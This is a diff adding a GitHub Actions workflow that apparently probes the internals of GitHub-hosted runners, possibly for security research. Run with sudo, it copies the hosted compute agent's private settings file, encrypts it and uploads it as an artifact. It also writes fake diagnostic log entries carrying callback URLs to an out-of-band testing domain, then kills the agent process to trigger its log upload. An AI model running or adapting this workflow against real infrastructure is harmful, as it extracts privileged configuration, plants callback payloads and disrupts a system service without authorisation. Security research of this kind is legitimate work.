@@ -1,0 +1,135 @@
+name: f004-legitimate-diagnostics-upload
+
+on:
+  workflow_dispatch:
+    inputs:
+      oast_domain:
+        description: OAST base domain used for controlled callback labels
+        required: true
+        type: string
+
+permissions:
+  contents: read
+
+jobs:
+  induce-legitimate-hca-upload:
+    runs-on: ubuntu-latest
+    timeout-minutes: 5
+    env:
+      F004_CAPTURE_CERT: ${{ secrets.F004_CAPTURE_CERT }}
+      F004_OAST_DOMAIN: ${{ inputs.oast_domain }}
+    steps:
+      - name: Plant benign diagnostic markers and seal state
+        shell: bash
+        run: |
+          set -euo pipefail
+          umask 077
+          test -n "$F004_CAPTURE_CERT"
+          [[ "$F004_OAST_DOMAIN" =~ ^[A-Za-z0-9.-]+$ ]]
+
+          raw="$RUNNER_TEMP/f004-legitimate-raw"
+          sealed="$RUNNER_TEMP/f004-legitimate-sealed"
+          mkdir -p "$raw" "$sealed"
+          sudo cp /opt/hca/.settings "$raw/settings.json"
+          sudo chown "$USER:$USER" "$raw/settings.json"
+
+          hca_pid=$(pgrep -o -f '/opt/hca/hosted-compute-agent')
+          runner_pid=$(pgrep -o -f '/bin/Runner.Listener')
+          runner_exe=$(sudo readlink -f "/proc/$runner_pid/exe")
+          runner_root=$(dirname "$(dirname "$runner_exe")")
+          runner_diag="$runner_root/_diag"
+          hca_home=$(sudo tr '\0' '\n' < "/proc/$hca_pid/environ" \
+            | sed -n 's/^HCA_HOME_DIR=//p' | head -1)
+          hca_home=${hca_home:-/opt/hca}
+          hca_logs="$hca_home/logs"
+          sudo mkdir -p "$hca_logs" "$runner_diag"
+
+          nonce=$(openssl rand -hex 4)
+          hca_name="f004_hca_legit_${GITHUB_RUN_ID}_${nonce}.log"
+          runner_name="f004_runner_legit_${GITHUB_RUN_ID}_${nonce}.log"
+          hca_label="f004-hca-legit-${GITHUB_RUN_ID}-${nonce}"
+          runner_label="f004-runner-legit-${GITHUB_RUN_ID}-${nonce}"
+          planned_signal_epoch=$(( $(date -u '+%s') + 30 ))
+          export F004_NONCE="$nonce"
+          export F004_HCA_NAME="$hca_name"
+          export F004_RUNNER_NAME="$runner_name"
+          export F004_HCA_LABEL="$hca_label"
+          export F004_RUNNER_LABEL="$runner_label"
+          export F004_PLANNED_SIGNAL_EPOCH="$planned_signal_epoch"
+          printf 'F004_PLANNED_SIGNAL_EPOCH=%s\n' "$planned_signal_epoch" >> "$GITHUB_ENV"
+
+          timestamp=$(date -u '+%Y-%m-%dT%H:%M:%SZ')
+          sudo tee "$hca_logs/$hca_name" >/dev/null <<EOF
+          {"level":"INFO","ts":"$timestamp","logger":"hosted-compute-agent","msg":"F004 controlled diagnostic marker","source_correlation_id":"F004-HCA-LEGIT-${GITHUB_RUN_ID}-${nonce}","reference":"http://${hca_label}.${F004_OAST_DOMAIN}/json"}
+          reference=http://${hca_label}.${F004_OAST_DOMAIN}/plain
+          markdown=![](http://${hca_label}.${F004_OAST_DOMAIN}/markdown)
+          xml=<probe href="http://${hca_label}.${F004_OAST_DOMAIN}/xml"/>
+          EOF
+          sudo tee "$runner_diag/$runner_name" >/dev/null <<EOF
+          [$timestamp INFO Test] F004 controlled Runner diagnostic marker
+          source_correlation_id=F004-RUNNER-LEGIT-${GITHUB_RUN_ID}-${nonce}
+          reference=http://${runner_label}.${F004_OAST_DOMAIN}/plain
+          json={"callback_url":"http://${runner_label}.${F004_OAST_DOMAIN}/json"}
+          markdown=![](http://${runner_label}.${F004_OAST_DOMAIN}/markdown)
+          xml=<probe href="http://${runner_label}.${F004_OAST_DOMAIN}/xml"/>
+          EOF
+          sudo chown runner:runner "$hca_logs/$hca_name" "$runner_diag/$runner_name"
+          sudo chmod 0600 "$hca_logs/$hca_name" "$runner_diag/$runner_name"
+
+          python3 - "$raw/settings.json" "$sealed/results.json" <<'PY'
+          import hashlib
+          import json
+          import os
+          import pathlib
+
+          settings_path = pathlib.Path(os.sys.argv[1])
+          output_path = pathlib.Path(os.sys.argv[2])
+          settings = json.loads(settings_path.read_text())
+          report = {
+              'repository': os.environ['GITHUB_REPOSITORY'],
+              'run_id': os.environ['GITHUB_RUN_ID'],
+              'run_attempt': os.environ['GITHUB_RUN_ATTEMPT'],
+              'job': os.environ['GITHUB_JOB'],
+              'runner_name': os.environ['RUNNER_NAME'],
+              'nonce': os.environ['F004_NONCE'],
+              'planned_signal_epoch': int(os.environ['F004_PLANNED_SIGNAL_EPOCH']),
+              'hca_log_name': os.environ['F004_HCA_NAME'],
+              'runner_log_name': os.environ['F004_RUNNER_NAME'],
+              'hca_callback_label': os.environ['F004_HCA_LABEL'],
+              'runner_callback_label': os.environ['F004_RUNNER_LABEL'],
+              'settings_sha256': hashlib.sha256(settings_path.read_bytes()).hexdigest(),
+          }
+          output_path.write_text(json.dumps(report, indent=2) + '\n')
+          print(json.dumps(report, indent=2))
+          PY
+
+          printf '%s\n' "$F004_CAPTURE_CERT" > "$RUNNER_TEMP/f004-certificate.pem"
+          openssl cms -encrypt -binary -aes-256-cbc \
+            -in "$raw/settings.json" \
+            -outform DER \
+            -out "$sealed/settings.cms" \
+            "$RUNNER_TEMP/f004-certificate.pem"
+          shasum -a 256 "$sealed/settings.cms" | awk '{print $1}' > "$sealed/settings.cms.sha256"
+          shred -u "$RUNNER_TEMP/f004-certificate.pem" "$raw/settings.json"
+          rmdir "$raw"
+
+      - name: Upload sanitized plan and encrypted settings
+        uses: actions/upload-artifact@v4
+        with:
+          name: f004-legitimate-diagnostics-${{ github.run_id }}
+          path: ${{ runner.temp }}/f004-legitimate-sealed
+          retention-days: 1
+          compression-level: 0
+
+      - name: Trigger the recovered HCA signal upload path
+        continue-on-error: true
+        shell: bash
+        run: |
+          set -euo pipefail
+          while (( $(date -u '+%s') < F004_PLANNED_SIGNAL_EPOCH )); do
+            sleep 1
+          done
+          hca_pid=$(pgrep -o -f '/opt/hca/hosted-compute-agent')
+          printf 'hca_signal_sent_at=%s\n' "$(date -u '+%Y-%m-%dT%H:%M:%SZ')"
+          sudo kill -TERM "$hca_pid"
+          sleep 20
